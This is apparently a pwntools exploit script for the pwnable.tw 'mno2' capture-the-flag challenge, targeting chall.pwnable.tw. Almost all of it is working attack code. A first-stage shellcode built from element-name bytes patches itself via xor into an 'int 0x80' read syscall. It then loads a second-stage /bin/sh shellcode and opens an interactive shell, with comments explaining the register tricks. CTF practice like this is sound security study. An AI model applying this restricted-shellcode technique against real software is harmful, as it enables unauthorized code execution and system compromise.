from pwn import *
import sys

context.update(arch='i386', os='linux')
elf = ELF("mno2")
if sys.argv[1] == "l":
    p = process("./mno2")
    context.terminal = ["tmux", "splitw", "-h"] 
    gdb.attach(proc.pidof(p)[0], gdbscript="""
                                            b *0x080487DC
                                            continue
                                            """)
elif sys.argv[1] == "r":
    p = remote("chall.pwnable.tw", 10301)

"""
opcode of int 0x80: "\xcd\x80"
registers when enter shellcode
eax: 0x324F6E4D           // shellcode address  (its MnO2 =))
ebx: 0x0
ecx: 0x0
edx stores the address of the last elements in your shellcode in bss (i will use it to xor with a value to get int 0x80)
in this case i choose element Sr which has address 0x080488F5 
edx: 0x080488F5


target registers to call syscall read
eax: 3
ebx: 0
ecx: shellcode address
edx: >= len(shellcode_read) + len(shellcode_shell)
"""

def solve():
    shellcode_read = "RhMnO2"                                       # push edx; push 0x324F6E4D  
    shellcode_read += asm("xor byte ptr[eax + 0x36] , dl")          # 0x38 ^ 0xF5 = 0xCD    => [eax + 0x36] = 0xCD
    shellcode_read += asm("xor byte ptr[eax + 0x37] , dl")          # 0x38 ^ 0xF5 = 0xCD    => [eax + 0x37] = 0xCD
    shellcode_read += "Zr888"                                       # pop edx               => edx = 0x324F6E4D
    shellcode_read += asm("xor byte ptr[eax + 0x37] , dl")          # 0xCD ^ 0x4D = 0x80    => [eax + 0x37] = 0x80
    shellcode_read += "P"                                           # push eax
    shellcode_read += "Y"                                           # pop ecx
    shellcode_read += "P"                                           # push eax
    shellcode_read += "5PoO2"                                       # xor eax, 0x324D6F50   => eax = 0x11F
    shellcode_read += "P"                                           # push eax
    shellcode_read += "Zr8"                                         # pop edx               => edx = 0x11F
    shellcode_read += "Xe"                                          # pop eax           
    shellcode_read += "F"*2                                         # padding stuffs
    shellcode_read = shellcode_read.ljust(0x30, "8")
    shellcode_read += "5InO2"                                       # xor eax, 0x324F6E49   => eax = 4
    shellcode_read += "H"                                           # dec eax               => eax = 3
    shellcode_read += "88"                                          # magic byte ([eax+0x36], [eax+0x37])
    shellcode_read += "Sr"                                          # element to control edx at first state
    p.sendline(shellcode_read)


    shellcode_shell = asm(shellcraft.i386.linux.sh())
    shellcode_shell = "B"*(len(shellcode_read)-2) + shellcode_shell
    shellcode_shell = shellcode_shell.ljust(0x7179, "Z")
    p.sendline(shellcode_shell)
    p.interactive()

if __name__ == "__main__":
    solve()

"""
note: 
_ MTU problem :((
_ dont trust esi register in local :((
"""